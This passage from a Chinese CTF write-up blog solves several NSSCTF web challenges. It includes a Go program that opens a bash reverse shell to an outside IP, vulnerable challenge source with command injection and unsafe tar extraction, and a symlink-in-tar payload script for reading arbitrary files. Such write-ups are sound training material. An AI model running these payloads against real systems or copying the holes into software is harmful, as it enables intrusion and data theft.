alt="image-20230328190433293"></p><p>可以发现后台命令执行的代码大概长这样<code>命令执行(go 文件名前缀 文件路径)</code>，所以这里构造一下执行的命令，上传一个run.go文件，则会执行<code>go run run.go</code></p><p><strong>前面上传1.php只执行go 1的原因是没有1这个命令</strong></p><p>这里我们就直接用网上有的代码进行修改来反弹shell</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">cmd := exec.Command(<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/101.42.39.110/666 0&gt;&amp;1&quot;</span>)</span><br><span class="line">out, err := cmd.CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="type">string</span>(out))</span><br><span class="line">log.Fatalf(<span class="string">&quot;cmd.Run() failed with %s\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="type">string</span>(out))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag一个在根目录一个在/home/galf</p><h2 id="NSSRound-7-Team-0o0"><a href="#NSSRound-7-Team-0o0" class="headerlink" title="[NSSRound#7 Team]0o0"></a>[NSSRound#7 Team]0o0</h2><p>考点</p><p><img src="../images/image-20230328192745454.png" alt="image-20230328192745454"></p><p>题目</p><p><img src="../images/image-20230328192754980.png" alt="image-20230328192754980"></p><p>扫一下目录发现了一个泄露</p><p>下载后发现</p><p><img src="../images/image-20230328192940974.png" alt="image-20230328192940974"></p><p>存在一个php代码，访问之后拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$NSSCTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NSSCTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsSCTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsSCTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsScTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsScTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsScTf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsScTf&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NSScTf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NSScTf&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$nSScTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nSScTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$nSscTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nSscTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$NSSCTF</span> != <span class="variable">$NsSCTF</span> &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$NSSCTF</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$NsSCTF</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$NsScTF</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$NsScTF</span>, <span class="keyword">array</span>(<span class="number">1</span>))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$NsScTf</span>) === <span class="string">&quot;Welcome to Round7!!!&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nss_ctfer.vip&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$NSScTf</span> != <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$NSScTf</span>, <span class="number">0</span>) === <span class="number">114514</span>) &#123;</span><br><span class="line">                    <span class="variable">$nss</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$nSScTF</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$nSscTF</span>) !== <span class="string">&quot;NSSRound7&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$nss</span> &amp;&amp; <span class="variable">$nSscTF</span> === <span class="string">&quot;NSSRound7&quot;</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">                            <span class="variable">$file_name</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">                            <span class="variable">$path</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">                            <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$file_name</span>, <span class="string">&quot;.png&quot;</span>) == <span class="literal">false</span>)&#123;</span><br><span class="line">                                <span class="keyword">die</span>(<span class="string">&quot;NoO0P00oO0! Png! pNg! pnG!&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>);</span><br><span class="line">                            <span class="variable">$real_content</span> = <span class="string">&#x27;&lt;?php die(&quot;Round7 do you like&quot;);&#x27;</span>. <span class="variable">$content</span> . <span class="string">&#x27;?&gt;&#x27;</span>;</span><br><span class="line">                            <span class="variable">$real_name</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_name</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$real_name</span>, <span class="variable">$real_content</span>);</span><br><span class="line">                            <span class="title function_ invoke__">fclose</span>(<span class="variable">$real_name</span>);</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;OoO0o0hhh.&quot;</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;NoO0oO0oO0!&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;N0o0o0oO0o!&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;NoOo00O0o0!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Noo0oO0oOo!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO0o0oO0oO!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No0o0o000O!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;NO0o0o0o0o!&quot;</span>);</span><br><span class="line">&#125; NO0o0o0o0o!</span><br></pre></td></tr></table></figure><p>这个看起来比较绕</p><p><a href="https://blog.csdn.net/m0_64815693/article/details/128784449?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168000275616800180675463%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168000275616800180675463&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-128784449-null-null.142^v76^control_1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=%5BNSSRound%237%20Team%5D0o0&amp;spm=1018.2226.3001.4187">这篇文章写的很详细了</a></p><p>只不过里面有个点写错了，就是绕过<code>if ($NSScTf != 114514 &amp;&amp; intval($NSScTf, 0) === 114514)</code>这个的时候</p><p><img src="../images/image-20230328195154093.png" alt="image-20230328195154093"></p><p>应该要这样绕过</p><p><a href="https://dqgom7v7dl.feishu.cn/docx/RL8cdsipLoYAMvxl8bJcIERznWH">探姬写的关于死亡die绕过的，还有一些关于文件包含的filter</a></p><p>就是很有学习价值</p><h2 id="NSSRound-7-Team-ShadowFlag"><a href="#NSSRound-7-Team-ShadowFlag" class="headerlink" title="[NSSRound#7 Team]ShadowFlag"></a>[NSSRound#7 Team]ShadowFlag</h2><p>考点</p><p><img src="../images/image-20230328195559824.png" alt="image-20230328195559824"></p><p><a href="https://www.bilibili.com/video/BV1jY411S71X/?vd_source=bacfffe46b930fda5761b63367eb298c">wp视频地址</a></p><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag1 = <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag2.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag2 = f.read()</span><br><span class="line">tag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&quot;r+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/shell&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():</span><br><span class="line">    <span class="keyword">global</span> tag</span><br><span class="line">    <span class="keyword">if</span> tag != <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">global</span> flag1</span><br><span class="line">        <span class="keyword">del</span> flag1</span><br><span class="line">        tag = <span class="literal">True</span></span><br><span class="line">    os.system(<span class="string">&quot;rm -f /tmp/flag1.txt /tmp/flag2.txt&quot;</span>)</span><br><span class="line">    action = request.form[<span class="string">&quot;act&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> action.find(<span class="string">&quot; &quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Nonono&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        os.system(action)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Wow&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error_date</span>(<span class="params">error</span>):</span><br><span class="line">    sleep(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;扫扫扫，扫啥东方明珠呢[怒]&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这道题可以学到很多</p><p><a href="https://dqgom7v7dl.feishu.cn/docx/RL8cdsipLoYAMvxl8bJcIERznWH">反弹shell大合集</a></p><p><a href="https://blog.csdn.net/qq_63169208/article/details/129267023?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168000642516800186549329%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=168000642516800186549329&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-129267023-null-null.142^v76^control_1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=ShadowFlag&amp;spm=1018.2226.3001.4187">wp文章</a></p><p>这里的话就是利用下面的os.system进行反弹shell，因为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag1 = <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag2.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br></pre></td></tr></table></figure><p>有with的话是打开文件后会关闭，没有with的是不会关闭</p><p>所以说flag1就会一直存在在后台进程里面，不会被结束</p><p>删除了没事，在后台进程还是能看到</p><p>这就是全部了</p><p><a href="https://github.com/Randark-JMT/NSSCTF-Round_v7-ShadowFlag">题目的github地址</a></p><h2 id="NSSRound-6-Team-check-V1"><a href="#NSSRound-6-Team-check-V1" class="headerlink" title="[NSSRound#6 Team]check(V1)"></a>[NSSRound#6 Team]check(V1)</h2><p>考点</p><p><img src="../images/image-20230328210025627.png" alt="image-20230328210025627"></p><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = <span class="built_in">set</span>([<span class="string">&#x27;tar&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">        filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(file.filename)</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename) <span class="keyword">and</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> file.filename <span class="keyword">and</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], file.filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;This file is not a tarfile&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tar = tarfile.<span class="built_in">open</span>(file_save_path, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        tar.extractall(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    filename = request.form.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filepath) <span class="keyword">or</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clean&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_file</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;/tmp/clean.sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>漏洞点在于  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar = tarfile.<span class="built_in">open</span>(file_save_path, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">tar.extractall(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])</span><br></pre></td></tr></table></figure><p><strong>思路</strong></p><p>生成一个<a href="https://so.csdn.net/so/search?q=软链接&amp;spm=1001.2101.3001.7020">软链接</a>，通过<code>软链接</code>链接到<code>/flag文件</code>，然后将软链接打包成tar文件上传，之后再读取文件，读取文件时，由于<code>extractall</code>提取出来的是一个软链接，后面读取的时候就是/flag文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /flag flag</span><br><span class="line">tar -cvf flag.tar flag</span><br></pre></td></tr></table></figure><p><strong>软链接可以实现任意文件的读取</strong></p><p>这里就是先通过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar = tarfile.open(file_save_path, &quot;r&quot;)</span><br><span class="line">tar.extractall(app.config[&#x27;UPLOAD_FOLDER&#x27;])</span><br></pre></td></tr></table></figure><p>解压压缩包，然后extractall提取的是一个软链接，后面跟着的是提取出来的flag</p><p>然后在访问download，就是实现读取代码，读取到解压后名字为flag的文件</p><p>flag.tar    解压后——&gt;    flag</p><p><strong>所以payload脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.142.108.3:28089/&quot;</span></span><br><span class="line">filename = <span class="string">r&quot;./flag.tar&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">url ,fileName</span>):</span><br><span class="line">    url = url + <span class="string">&quot;upload&quot;</span></span><br><span class="line">    file = &#123;<span class="string">&quot;file&quot;</span>:<span class="built_in">open</span>(fileName,<span class="string">&#x27;rb&#x27;</span>)&#125; <span class="comment">#这里是上传文件</span></span><br><span class="line">    response = req.post(url=url, files = file)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">url</span>):</span><br><span class="line">    url = url+<span class="string">&quot;download&quot;</span></span><br><span class="line">    file = &#123;<span class="string">&quot;filename&quot;</span>:<span class="string">&quot;flag&quot;</span>&#125; <span class="comment">#这里是post数据</span></span><br><span class="line">    response = req.post(url, data=file)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    upload(url,filename)</span><br><span class="line">    download(url)</span><br></pre></td></tr></table></figure><p>tar包在自己的kali上生成</p><h2 id="NSSRound-6-Team-check-V2"><a href="#NSSRound-6-Team-check-V2" class="headerlink" title="[NSSRound#6 Team]check(V2)"></a>[NSSRound#6 Team]check(V2)</h2><p>考点</p><p><img src="../images/image-20230329111310192.png" alt="image-20230329111310192"></p><p>上一题的升级版</p><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 